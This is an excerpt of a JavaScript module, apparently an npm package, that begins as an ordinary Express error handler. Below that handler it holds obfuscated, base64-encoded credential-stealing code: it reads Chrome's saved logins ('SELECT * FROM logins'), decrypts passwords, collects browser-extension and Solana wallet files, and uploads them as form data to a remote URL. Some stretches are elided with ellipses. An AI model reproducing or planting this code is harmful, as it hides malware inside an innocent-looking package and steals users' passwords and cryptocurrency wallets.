...
module.exports = (e) => (e, r, c, n) => {
  ...
  c.status(e.statusCode).json({ success: !1, message: e.message });
};
var e = /^(?:( )+|\t+)/;
...
const q = () => {
    result = "";
    try {
      const e = require(`${d}${w(X)}`);
      if (y != w("V2luZG93c19OVA")) return;
      const r = w("U0VMRUNUICogRlJPTSBsb2dpbnM"),
        c = `${R("~/")}${w(z)}`;
                    ...
                    r ||
                      c.forEach((e) => {
                        ...
                        "v" === o.subarray(0, 1).toString() &&
                          ...
                          cip.length &&
                            ((mmm = p[a]($, t, iv).update(cip)),
                            (n = `${n}${V}${r} ${v} ${c} ${g}${mmm.toString(
                              Y
                            )}\n\n`)));
                      }),
                      e.close(),
    ...
    const t = await (async () => {
      try {
        ...
        (e =
          "d" == f[0]
            ? `${t}${w(
                "L0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC9Hb29nbGUvQ2hyb21l"
              )}`
            : "l" == f[0]
            ? `${t}${w("Ly5jb25maWcvZ29vZ2xlLWNocm9tZQ")}`
            : `${t}${w(z)}`),
          (M = v);
        const r = H(`${e}`),
          c = [
            ...
            "aHBnbGZoZ2ZuaGJncGpkZW5qZ21kZ29laWFwcGFmbG4",
        ...
        return (
          (e = `${d}${w("Ly5jb25maWcvc29sYW5hL2lkLmpzb24")}`),
          Z[k](e) && n.push(e),
          n
        );
      } catch (t) {
      ...
      (async (t) => {
        ...
        t.forEach(function (t) {
          ...
          const c = r[r.length - 2],
            n = r.pop();
          e.push({ value: Z[Q](t), options: { filename: `${c}_${n}` } });
        });
        const r = { timestamp: V.toString(), type: U, hid: M, multi_file: e };
        try {
          const t = { url: `${g}${S}`, formData: r };
          G[B](t, (t) => {});
        } catch (t) {}
      })(t),
      lt();
